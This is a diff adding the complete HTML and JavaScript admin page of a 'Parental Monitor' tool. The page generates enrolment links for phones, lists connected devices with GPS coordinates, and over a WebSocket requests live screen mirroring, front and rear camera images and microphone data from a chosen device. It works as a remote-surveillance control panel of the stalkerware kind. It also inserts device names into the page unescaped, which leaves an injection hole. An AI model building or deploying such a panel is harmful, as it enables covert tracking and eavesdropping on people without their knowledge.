@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial; background: #f5f5f5; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { color: #333; margin-bottom: 30px; }
+        .section { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        input { padding: 10px; border: 1px solid #ddd; border-radius: 5px; width: 300px; margin-right: 10px; }
+        button { padding: 10px 20px; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #5568d3; }
+        .link-box { margin-top: 15px; padding: 15px; background: #f9f9f9; border-radius: 5px; }
+        .link-box input { width: 100%; margin: 0; }
+        .devices { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
+        .device { padding: 15px; border: 2px solid #ddd; border-radius: 8px; cursor: pointer; }
+        .device.online { border-color: #4caf50; background: #f1f8f4; }
+        .device.offline { border-color: #f44336; background: #fef1f0; }
+        .device h3 { margin-bottom: 10px; }
+        .status { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; }
+        .status.online { background: #4caf50; color: white; }
+        .status.offline { background: #f44336; color: white; }
+        .monitor { display: none; }
+        .monitor.active { display: block; }
+        .monitor-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 20px; }
+        .monitor-box { padding: 15px; background: #f9f9f9; border-radius: 8px; }
+        .monitor-box h4 { margin-bottom: 10px; }
+        .monitor-box img { width: 100%; border-radius: 5px; }
+        .back-btn { background: #999; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 Parental Monitor - Admin Panel</h1>
+        
+        <div class="section">
+            <h2>➕ Generate Device Link</h2>
+            <input type="text" id="deviceName" placeholder="Enter device name">
+            <button onclick="generateLink()">Generate Link</button>
+            <div id="linkBox" class="link-box" style="display:none;">
+                <input type="text" id="deviceLink" readonly>
+                <button onclick="copyLink()">Copy Link</button>
+            </div>
+        </div>
+        
+        <div class="section" id="devicesSection">
+            <h2>📱 Connected Devices</h2>
+            <div class="devices" id="deviceList"></div>
+        </div>
+        
+        <div class="section monitor" id="monitorSection">
+            <button class="back-btn" onclick="showDevices()">← Back to Devices</button>
+            <h2 id="monitorTitle">Device Monitor</h2>
+            <div class="monitor-grid">
+                <div class="monitor-box">
+                    <h4>📺 Screen Mirror</h4>
+                    <div id="screenView">Waiting...</div>
+                    <button onclick="startScreen()">Start Screen</button>
+                </div>
+                <div class="monitor-box">
+                    <h4>📷 Camera</h4>
+                    <div id="cameraView">Waiting...</div>
+                    <button onclick="startCamera('front')">Front</button>
+                    <button onclick="startCamera('rear')">Rear</button>
+                </div>
+                <div class="monitor-box">
+                    <h4>🎤 Microphone</h4>
+                    <div id="audioView">Waiting...</div>
+                    <button onclick="startAudio()">Start Audio</button>
+                </div>
+                <div class="monitor-box">
+                    <h4>📍 Location</h4>
+                    <div id="locationView">Waiting...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let ws;
+        let devices = [];
+        let selectedDevice = null;
+
+        function connect() {
+            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${wsProtocol}//${window.location.host}?type=admin`);
+            
+            ws.onopen = () => console.log('Connected');
+            
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                
+                if (data.type === 'devices') {
+                    devices = data.devices;
+                    renderDevices();
+                } else if (data.type === 'device_update') {
+                    const idx = devices.findIndex(d => d.id === data.device.id);
+                    if (idx >= 0) devices[idx] = data.device;
+                    else devices.push(data.device);
+                    renderDevices();
+                } else if (data.type === 'location') {
+                    updateLocation(data.deviceId, data.lat, data.lng);
+                } else if (data.type === 'screen') {
+                    document.getElementById('screenView').innerHTML = `<img src="${data.image}">`;
+                } else if (data.type === 'audio') {
+                    document.getElementById('audioView').innerHTML = `🎤 Level: ${data.audio}`;
+                } else if (data.type === 'camera') {
+                    document.getElementById('cameraView').innerHTML = `<img src="${data.image}">`;
+                }
+            };
+            
+            ws.onclose = () => setTimeout(connect, 3000);
+        }
+
+        function renderDevices() {
+            const list = document.getElementById('deviceList');
+            list.innerHTML = devices.map(d => `
+                <div class="device ${d.status}" onclick="selectDevice('${d.id}')">
+                    <h3>${d.name}</h3>
+                    <span class="status ${d.status}">${d.status}</span>
+                    <p>📍 ${d.lat ? d.lat.toFixed(4) : '0.0000'}, ${d.lng ? d.lng.toFixed(4) : '0.0000'}</p>
+                </div>
+            `).join('');
+        }
+
+        function generateLink() {
+            const name = document.getElementById('deviceName').value;
+            if (!name) return alert('Enter device name');
+            
+            const id = Math.random().toString(36).substr(2, 8);
+            const protocol = window.location.protocol;
+            const host = window.location.host;
+            const link = `${protocol}//${host}/device.html?id=${id}&name=${encodeURIComponent(name)}`;
+            
+            fetch('/api/device/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id, name })
+            });
+            
+            document.getElementById('deviceLink').value = link;
+            document.getElementById('linkBox').style.display = 'block';
+        }
+
+        function copyLink() {
+            const input = document.getElementById('deviceLink');
+            input.select();
+            document.execCommand('copy');
+            alert('Link copied!');
+        }
+
+        function selectDevice(id) {
+            selectedDevice = devices.find(d => d.id === id);
+            document.getElementById('monitorTitle').textContent = `Monitor: ${selectedDevice.name}`;
+            document.getElementById('devicesSection').style.display = 'none';
+            document.getElementById('monitorSection').classList.add('active');
+            document.getElementById('locationView').innerHTML = `📍 ${selectedDevice.lat || 0}, ${selectedDevice.lng || 0}`;
+        }
+
+        function showDevices() {
+            document.getElementById('devicesSection').style.display = 'block';
+            document.getElementById('monitorSection').classList.remove('active');
+        }
+
+        function startScreen() {
+            if (selectedDevice) {
+                ws.send(JSON.stringify({ type: 'request_screen', deviceId: selectedDevice.id }));
+            }
+        }
+
+        function startAudio() {
+            if (selectedDevice) {
+                ws.send(JSON.stringify({ type: 'request_audio', deviceId: selectedDevice.id }));
+            }
+        }
+
+        function startCamera(type) {
+            if (selectedDevice) {
+                ws.send(JSON.stringify({ type: 'request_camera', deviceId: selectedDevice.id, camera: type }));
+            }
+        }
+
+        function updateLocation(deviceId, lat, lng) {
+            const device = devices.find(d => d.id === deviceId);
+            if (device) {
+                device.lat = lat;
+                device.lng = lng;
+                if (selectedDevice && selectedDevice.id === deviceId) {
+                    document.getElementById('locationView').innerHTML = `📍 ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                }
+            }
+        }
+
+        connect();
+    </script>
+</body>
+</html>
